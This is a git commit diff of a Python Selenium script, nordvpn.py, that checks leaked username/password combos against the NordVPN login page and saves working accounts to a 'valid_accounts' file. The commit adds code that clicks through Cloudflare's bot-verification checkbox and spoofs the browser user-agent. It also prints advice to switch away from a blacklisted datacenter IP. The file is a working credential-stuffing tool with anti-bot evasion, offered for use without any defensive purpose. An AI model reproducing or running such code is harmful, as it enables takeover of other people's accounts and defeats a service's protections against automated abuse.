a9d363e36167c73dd8ce89c27ae4d6d0577f53d1
roberto <roberto@Debian.myguest.virtualbox.org>
2023-09-23 05:58:36 +0100

    added: cloudflare clicking, timeouts

--- nordvpn.py
+++ nordvpn.py
@@ -9,9 +9,13 @@ from pathlib import Path
 from selenium.webdriver.common.by import By
 from header import title
 
+
+
 user = []
 password = []
 retries = 0
+counter = 0
+
 if getattr(sys, 'frozen', False):# and hasattr(sys, 'MEIPASS'):
     user_directory = str(Path(sys.executable).parent) + "\\nord.txt"
     save_directory = str(Path(sys.executable).parent) + "\\valid_accounts"
@@ -42,24 +46,48 @@ title()
 while index != len(user):
     try:
         if retries > 5:
-            print("\nToo many errors\nEnding.")
+            print("\n\nToo many errors. \n\nUndetected Chromedriver can't bypass Cloudflare if you are using a "
+                  "blacklisted datacenter IP address. If this is the case, try changing your IP and try again. "
+                  "\nEnding.")
             exit()
         with open(save_directory + save_file, 'a') as accounts:
             browser_options = stealthdriver.ChromeOptions()
             browser_options.add_argument(
-                'user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) '
-                'Chrome/103.0.5060.134 ''Safari/537.36')
+                'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
+                'Chrome/117.0.0.0 Safari/537.36')
+            #browser_options.add_argument("--auto-open-devtools-for-tabs")
             # browser_options.add_argument('--headless=new')
             browser = stealthdriver.Chrome(options=browser_options)
             page = 'https://www.nordvpn.com/'
             browser.set_window_size(800, 200)
             browser.get(page)
             print('\rTrying Combo {} out of {}'.format(index + 1, len(user)), end='')
-            time.sleep(5)
             continue_button = browser.find_element(By.XPATH, '//*[@id="js-HeaderV3__mini-nav"]/li[3]/a')
             continue_button.click()
-            time.sleep(8)
+            time.sleep(3)
             browser.switch_to.window(browser.window_handles[1])
+            time.sleep(1)
+            start = time.time()
+            while True:
+                if browser.find_elements(By.XPATH, '/html/body/div/div/div/main/form/fieldset/div/span/input'):
+                    break
+                if time.time() - start > 50 and counter == 0:
+                    print("\n\nCloudflare Time Out")
+                    exit()
+                if counter > 5:
+                    print("\n\nCould not bypass Cloudflare IUAM."
+                          "\nEnding.")
+                    exit()
+                if browser.find_elements(By.XPATH, '/html/body/div[1]/div/div[1]/div/div/iframe'):
+                    iframe = browser.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/div/div/iframe')
+                    browser.switch_to.frame(iframe)
+                    time.sleep(1)
+                    if browser.find_elements(By.CSS_SELECTOR, 'input[type=checkbox]'):
+                        verification = browser.find_element(By.CSS_SELECTOR, 'input[type=checkbox]')
+                        verification.click()
+                        counter += 1
+                browser.switch_to.default_content()
+                time.sleep(5)
             email_box = browser.find_element(By.XPATH, '/html/body/div/div/div/main/form/fieldset/div/span/input')
             continue_button = browser.find_element(By.XPATH, '//*[@id="app"]/div/div/main/form/fieldset/button')
             email_box.send_keys(user[index])
@@ -90,10 +118,12 @@ while index != len(user):
             browser.quit()
             index += 1
             retries = 0
-    except NoSuchElementException:
+    except NoSuchElementException as b:
         print(" | Error: No Such Element - Retrying")
         retries += 1
-    except WebDriverException:
+        browser.quit()
+    except WebDriverException as e:
         print(" | Error: Web Driver Exception - Retrying")
         retries += 1
+        browser.quit()
 
